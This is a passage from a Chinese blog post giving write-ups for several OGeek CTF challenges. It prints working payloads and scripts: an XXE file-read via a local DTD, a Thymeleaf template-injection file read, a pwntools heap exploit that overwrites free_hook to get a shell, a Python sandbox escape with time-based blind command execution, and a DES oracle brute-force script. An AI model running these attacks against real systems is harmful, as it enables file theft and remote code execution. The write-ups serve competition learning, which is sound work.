<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var data = "<span class="meta">&lt;?xml version=\"1.0\" ?&gt;</span>\n<span class="tag">&lt;<span class="name">request</span>&gt;</span>\n    <span class="tag">&lt;<span class="name">status</span>&gt;</span>1<span class="tag">&lt;/<span class="name">status</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">request</span>&gt;</span>";</span><br><span class="line"></span><br><span class="line">setInterval(function()&#123;</span><br><span class="line">    $.post("callback", data);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure>

<p>猜测是XXE</p>
<p>于是进入接口callback</p>
<p><img src="/2019/08/27/OGeek_WP/1566744617867.png" alt="1566744617867"></p>
<p>要POST，所以抓包，</p>
<p>然后不久前学XXE时看到过这篇根据本地DTD来实现XXE的文章</p>
<p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
<p>于是想在这里试试。</p>
<p>但是本地有啥DTD文件呢？发现题目给了提示。于是根据题目描述，下载同名镜像，</p>
<p>给个docker，然后找其中的dtd文件，发现了一个文章中提到的文件</p>
<p>/usr/share/xml/fontconfig/fonts.dtd</p>
<p>于是用文章里的payload 一把梭</p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message [</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">xml</span>/<span class="attr">fontconfig</span>/<span class="attr">fonts.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">expr</span> '<span class="attr">aaa</span>)&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">abcxyz</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">        &amp;#x25;eval;</span></span><br><span class="line"><span class="xml">        &amp;#x25;error;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">aa</span> (<span class="attr">bb</span>'&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">    %local_dtd;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2019/08/27/OGeek_WP/1566744838904.png" alt="1566744838904"></p>
<p>flag{f1c6811d4dce2ae37613cee977febe305f4de8fe}</p>
<h3 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h3><p>题目描述：Write something you want to see.</p>
<p>进入靶机，f12，发现：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="keyword">e</span><span class="variable">l:</span> <span class="string">'#app'</span>,</span><br><span class="line">    dat<span class="variable">a:</span> &#123;</span><br><span class="line">        conten<span class="variable">t:</span> <span class="string">''</span>,</span><br><span class="line">        resul<span class="variable">t:</span> <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method<span class="variable">s:</span> &#123;</span><br><span class="line">        reques<span class="variable">t:</span> <span class="function"><span class="keyword">function</span><span class="params">(event)</span> &#123;</span></span><br><span class="line">            var <span class="keyword">vm</span> = this</span><br><span class="line">            axios.post(<span class="string">'/render'</span>, &#123;</span><br><span class="line">                conten<span class="variable">t:</span> <span class="keyword">vm</span>.content</span><br><span class="line">            &#125;)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> <span class="params">(response)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(response)</span><br><span class="line">                    <span class="keyword">vm</span>.result = response.data.result</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="keyword">catch</span>(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(error)</span><br><span class="line">                    <span class="keyword">vm</span>.result = error</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>再根据题目Render，应该是个SSTI无疑</p>
<p>学习文章：<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a></p>
<p>但是表示自己太菜了，甚至没看出来这个网页的框架</p>
<p>于是先去做了别的题。</p>
<p>之后队友说，是springboot，他说进入<a href="http://47.107.244.251:18080/render回显的是" target="_blank" rel="noopener">http://47.107.244.251:18080/render回显的是</a></p>
<p><img src="/2019/08/27/OGeek_WP/1566791814833.png" alt="1566791814833"></p>
<p>遂抓包，得到</p>
<p><img src="/2019/08/27/OGeek_WP/1566744957290.png" alt="1566744957290"></p>
<p>因为Spring Boot 官方推荐使用 “Thymeleaf”模板引擎</p>
<p>于是试试是否有Thymeleaf 渲染</p>
<p><img src="/2019/08/27/OGeek_WP/1566792157110.png" alt="1566792157110"></p>
<p>发现失败，把思路丢给队友，让他再去试试。</p>
<p>最后很尴尬，队友说，我符号用错了，该用大括号，（啊，低级错误，233333）</p>
<p><img src="/2019/08/27/OGeek_WP/1566792249505.png" alt="1566792249505"></p>
<p>回显成功，于是java读文件一把梭</p>
<p>payload</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>发包得到flag</p>
<p><img src="/2019/08/27/OGeek_WP/1566745025562.png" alt="1566745025562"></p>
<p>flag{nBz9mertYP@pyyZxx9@nn}</p>
<h3 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h3><p>题目描述：Hidden in the history</p>
<p>下载得到图片</p>
<p>放进Stegsolve.jar，调整通道发现端倪</p>
<p><img src="/2019/08/27/OGeek_WP/1566746459168.png" alt="1566746459168"></p>
<p>LSB隐写，</p>
<p>然后放进zsteg，导出得到字符串</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="attribute">QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA</span>==</span><br></pre></td></tr></table></figure>

<p>去掉括号base64得到:</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ao</span>(mgH[]<span class="symbol">WO</span>,r8US3GM2R2I<span class="comment">%YB7st</span></span><br></pre></td></tr></table></figure>

<p>然后看不出特征，于是先base全家桶试了一波，发现是base85</p>
<p>解得：flag{~h!%3W-9jKB6(fG}</p>
<h3 id="mblockchain"><a href="#mblockchain" class="headerlink" title="mblockchain*"></a>mblockchain*</h3><p>题目描述：Let’s warm up!</p>
<h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>题目描述：tip:题目环境为Ubuntu18.04，flag路径/home/flag</p>
<p>这个题可以利用堆上的相对偏移然后通过delete来double free，且2.27版本libc因为有tacahe机制，所以doublefree的利用变得非常简单，先填满7个chunk，再free一个到unsortedbin里面去，利用里面main_arean的地址改写后面2个字节，爆破一下可以得到free_hook中的chunk，通过改写free_hook为puts的plt表，然后通过delete函数找到对应可以泄露libc的地址的偏移，然后就可以打印出libc的地址，再改写free_hook为system函数地址，再通过libc上/bin/sh字符串的偏移，成功执行system(“/bin/sh”)，getshell。脚本如下</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hub')</span></span><br><span class="line">p = remote(<span class="string">'47.112.139.218'</span>, <span class="number">13132</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line">def choose(choice):</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(str(choice) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How long will you stay?\n'</span>)</span><br><span class="line">    p.sendline(str(size) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which hub don\'t you want?\n'</span>)</span><br><span class="line">    p.sendline(str(index) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want?\n'</span>)</span><br><span class="line">    p.<span class="built_in">send</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="string">'\xe8\x68'</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line">edit(p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x1ee0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3eba83</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"libcbase:%#x"</span> %libcbase)</span><br><span class="line">system_addr = libcbase + <span class="number">0x4f440</span></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x239a4e</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/OGeek_WP/1566789122210.png" alt="1566789122210"></p>
<h3 id="Enjoy-Your-Self"><a href="#Enjoy-Your-Self" class="headerlink" title="Enjoy Your Self *"></a>Enjoy Your Self *</h3><p>题目描述：time is the money</p>
<h3 id="8v"><a href="#8v" class="headerlink" title="8v"></a>8v</h3><p>题目描述：I run the js code and get flag</p>
<p>得到一份文档，全是字节码，遂开始一行一行“翻译”</p>
<p>参考文章</p>
<p><a href="https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc</a></p>
<p><a href="https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></p>
<p><a href="https://github.com/danbev/learning-v8" target="_blank" rel="noopener">https://github.com/danbev/learning-v8</a></p>
<p>看懂完指令并不是很难，核心就是一个简单的三项数异或加密，</p>
<p>然后存在两个类似于斐波那契数列的前后相关的数列，</p>
<p>数列a起始位是a<del>1</del>=88</p>
<p>函数是：a<del>n</del>=(a<del>n-1</del>*65+66)%256</p>
<p>得到数列：a = [88, 154, 92, 158, 96, 162, 100, 166, 104, 170, 108, 174, 112, 178, 116, 182, 120, 186, 124, 190, 128, 194, 132, 198, 136, 202, 140, 206, 144, 210,]</p>
<p>数列b起始位是b<del>1</del>=148</p>
<p>函数是：b<del>n</del>=(b<del>n-1</del>*35-16)%256</p>
<p>最后程序还有个将数列b逆序的操作</p>
<p>得到数列：b=[236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148, 12, 52, 236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148]</p>
<p>再加上</p>
<p>enc=b’\xd2”\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;’</p>
<p>最后三个数列逐位异或，得到</p>
<p>flag{V8_ByteCode_is_Very_Easy}</p>
<h3 id="PyBox"><a href="#PyBox" class="headerlink" title="PyBox"></a>PyBox</h3><p>题目描述：cut flag sleep repeat</p>
<p>连上沙箱</p>
<p><img src="/2019/08/27/OGeek_WP/1566793870950.png" alt="1566793870950"></p>
<p>看着像python，但是这个python为啥没有一点点功能？啥也不能干？也没有回显。</p>
<p>不过没有回显倒可以利用sql的时间盲注的方法，但是有啥功能能利用呢？</p>
<p>于是去学习沙箱逃逸一波</p>
<p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>
<p><img src="/2019/08/27/OGeek_WP/1566794006869.png" alt="1566794006869"></p>
<p>发现了这个，</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'l'</span>+<span class="string">'s home'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/OGeek_WP/1566794300675.png" alt="1566794300675"></p>
<p>没有报错，</p>
<p>但是这里没有回显呃，于是，时间盲注结合closure，</p>
<p>再根据这篇文章<a href="https://blog.csdn.net/caoshunxin01/article/details/79355566" target="_blank" rel="noopener">https://blog.csdn.net/caoshunxin01/article/details/79355566</a></p>
<p>利用cut - c 逐位爆破</p>
<p>payload:</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'flag_p=`cut -c 1 /home/flag`; [ $flag_p = \"f\" ] &amp;&amp; sleep 2'</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">	print(<span class="string">"get!"</span>)</span><br><span class="line">	break</span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img src="/2019/08/27/OGeek_WP/1566799922178.png" alt="1566799922178"></p>
<p>利用成功。再加两个循环，就好了。</p>
<p>得到结果</p>
<p><img src="/2019/08/27/OGeek_WP/1566800671679.png" alt="1566800671679"></p>
<p>不知道是不是后来改flag了，之前跑脚本得到的是</p>
<p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x}</p>
<p>写wp复现的时候得到的是</p>
<p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x_sorry}  </p>
<p>hhhh?</p>
<h3 id="Easy-Realworld-Challenge"><a href="#Easy-Realworld-Challenge" class="headerlink" title="Easy Realworld Challenge *"></a>Easy Realworld Challenge *</h3><p>题目描述：study easy easy easy Python (flag is in intranet `/flag`)</p>
<h3 id="Babycry"><a href="#Babycry" class="headerlink" title="Babycry"></a>Babycry</h3><p>nc 过去得到加密规则</p>
<p><img src="/2019/08/27/OGeek_WP/1566747202519.png" alt="1566747202519"></p>
<p>写wp的时候环境关了，这里就直接口述了。</p>
<p>既然加密规则是des（key,sth..flag{*}padding）</p>
<p>加上hint</p>
<p>所以我们控制输入，可以使得被加密的字符末尾为</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure>

<p>首先我们先输入</p>
<p>des a</p>
<p>des aa</p>
<p>des aaa</p>
<p>直到拼接后的字符串长度为8的倍数，</p>
<p>印象里应该是两个a的时候，就好了。</p>
<p>然后我们当输入三个a的时候，字符串应该就是aaaflag{*}再加上七个_，那么末尾就应该是一个}加七个_组成的，</p>
<p>密文末尾的8个字节，就是这一个}加七个_字符所组成的八个字符的密文</p>
<p>我们可以输入</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure>

<p>看返回的密文的前8个字节加一验证。</p>
<p>于是思路就是，控制padding，逐位爆破，</p>
<p>输入aaaa，返回密文的后8字节就是明文    </p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#125;______（<span class="number">6</span>个<span class="literal">_</span>）				<span class="meta">#?代表flag最后一位字符</span></span><br></pre></td></tr></table></figure>

<p>的密文</p>
<p>然后我们在爆破这一位，直到返回密文的前八个字节与输入aaaa返回的密文的最后8字节相同位置，</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"139.9.222.76"</span>,19999)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(33,126):</span><br><span class="line">    ans = <span class="string">"des "</span>+chr(i)+<span class="string">"&#125;______"</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(ans)</span><br><span class="line">    p = <span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"54f6d4254fe2a8d4"</span> <span class="keyword">in</span> p :</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"get!"</span>)</span><br><span class="line">        <span class="keyword">print</span>(ans)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<p><img src="/2019/08/27/OGeek_WP/1566788477725.png" alt="1566788477725"></p>
<p>然后以此类推，逐位爆破。</p>
<p>后面还有点区别就是，爆破完8位，用来验证的密文不能再从末尾找了，得找之前找的8个字节密文的前8个字节密文。</p>
<p>比赛的时候就是用这个半自动化脚本手撸的，</p>
<p>原本想在写wp的时候写个全自动化的，奈何环境关了，没法测试。遂放弃。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/27/OGeek_WP/" data-id="ck2g3l2iq000nlgv3yasot596" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-UP/">Write UP</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-UP/">Write UP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Write-Up/">Write Up</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book/">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/navigation/">navigation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/note/">note</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/private/">private</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Write-UP/" style="font-size: 16.67px;">Write UP</a> <a href="/tags/Write-Up/" style="font-size: 13.33px;">Write Up</a> <a href="/tags/book/" style="font-size: 10px;">book</a> <a href="/tags/navigation/" style="font-size: 10px;">navigation</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/private/" style="font-size: 10px;">private</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2099/12/">December 2099</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2099/12/31/题目导航(手动置顶)/">题目导航(手动置顶)</a>
          </li>
        
          <li>
            <a href="/2019/10/07/LCTF2018_bestphp's_revenge/">LCTF2018-bestphp&#39;s revenge</a>
          </li>
        
          <li>
            <a href="/2019/10/07/rsa套路笔记/">RSA套路笔记</a>
          </li>
        
          <li>
            <a href="/2019/10/01/遇见了一个人，犯了一个错/">遇见了一个人，犯了一个错</a>
          </li>
        
          <li>
            <a href="/2019/09/27/CISCN2019Easyweb/">CISCN2019Easyweb</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 V<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>